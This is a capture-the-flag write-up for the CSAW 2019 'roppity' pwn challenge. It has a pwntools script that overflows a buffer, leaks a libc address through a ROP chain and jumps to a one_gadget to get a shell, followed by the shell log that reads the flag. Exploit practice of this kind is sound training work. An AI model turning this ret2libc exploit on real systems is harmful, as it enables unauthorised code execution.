# CSAW_CTF_2019_pwn
## roppity
```python
from pwn import *

context.log_level = 'debug'
context.binary = './rop'
elf = context.binary
libc = elf.libc

pop_rdi = 0x400683

p = process('rop')
p = remote('pwn.chal.csaw.io', 5016)
p.recv()
payload = 'A' * 40 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(elf.sym['main'])
p.sendline(payload)
# puts_addr = p.recvuntil('\x7f')[:-6].ljust(8, '\x00')
puts_addr = u64(p.recv()[:-7].ljust(8, '\0'))
print puts_addr
libc.address = puts_addr - libc.sym['puts']
print 'libc.addr @ {:#x}'.format(libc.address)

# p.recv()
one_gadget = libc.address + 0x4f365
# payload = 'A' * 40 + p64(pop_rdi) + p64(next(libc.search('/bin/sh'))) + p64(libc.sym['system'])
payload = 'A' * 40 + p64(one_gadget)
```
```
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0xd bytes:
    'flag.txt\n'
    'rop\n'
flag.txt
rop
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    'cat flag.txt\n'
[DEBUG] Received 0x1e bytes:
    'flag{r0p_4ft3r_r0p_4ft3R_r0p}\n'
flag{r0p_4ft3r_r0p_4ft3R_r0p}
$
```
